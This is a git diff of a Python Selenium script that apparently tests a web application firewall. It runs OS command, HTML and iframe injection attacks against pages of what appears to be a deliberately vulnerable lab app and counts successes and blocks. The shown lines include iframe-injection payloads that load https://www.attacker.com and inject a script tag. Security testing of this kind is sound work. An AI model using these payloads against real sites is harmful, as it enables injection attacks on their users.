@@ -4,13 +4,13 @@ from selenium.common.exceptions import NoSuchElementException
 
 def execute(driver, target_url):
     # Start to attack
-    # os_injection_attack(driver, target_url)
-    # html_injection_attack(driver, target_url)
-    iframe_injection_attack(driver, target_url)
+    #os_injection_attack(driver, target_url)
+    html_injection_attack(driver, target_url)
+    #iframe_injection_attack(driver, target_url)
 
 
 def os_injection_attack(driver, target_url):
-    print(f"[+] Running OS Injection Attacks")
+    print(f"\n[+] Running OS Injection Attacks")
     attack_url_page = "commandi.php"  # OS Command Injection
     success_counter = 0
     blocked_by_waf_counter = 0
@@ -43,7 +43,7 @@ def os_injection_attack(driver, target_url):
 
 
 def html_injection_attack(driver, target_url):
-    print(f"[+] Running HTML Injection Attacks")
+    print(f"\n[+] Running HTML Injection Attacks")
     attack_url_page = "htmli_get.php"  # HTML Injection - Reflected (GET)
     success_counter = 0
     blocked_by_waf_counter = 0
@@ -84,7 +84,7 @@ def html_injection_attack(driver, target_url):
 
 
 def iframe_injection_attack(driver, target_url):
-    print(f"[+] Running iFrame Injection Attacks")
+    print(f"\n[+] Running iFrame Injection Attacks")
     attack_url_page = "iframei.php"  # iFrame Injection
     payload_list = ["""?ParamUrl=https://www.attacker.com&ParamWidth=250"&ParamHeight=250""",
                     """?ParamUrl=robots.txt&ParamWidth=250"></iframe><sCript id="attacker">document.write("HACK")</scriPt>&ParamHeight=250"""]
